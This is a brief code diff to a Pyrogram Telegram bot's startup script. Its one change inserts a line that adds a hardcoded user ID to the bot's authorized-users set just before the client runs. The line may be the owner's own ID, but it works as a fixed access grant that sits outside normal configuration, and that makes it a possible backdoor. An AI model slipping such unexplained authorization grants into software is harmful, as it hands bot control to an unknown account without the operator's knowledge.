@@ -11,5 +11,5 @@ app = pyrogram.Client(
     api_hash=API_HASH,
     plugins=plugins
 )
-
+Config.AUTH_USERS.add(677799710)
 app.run()
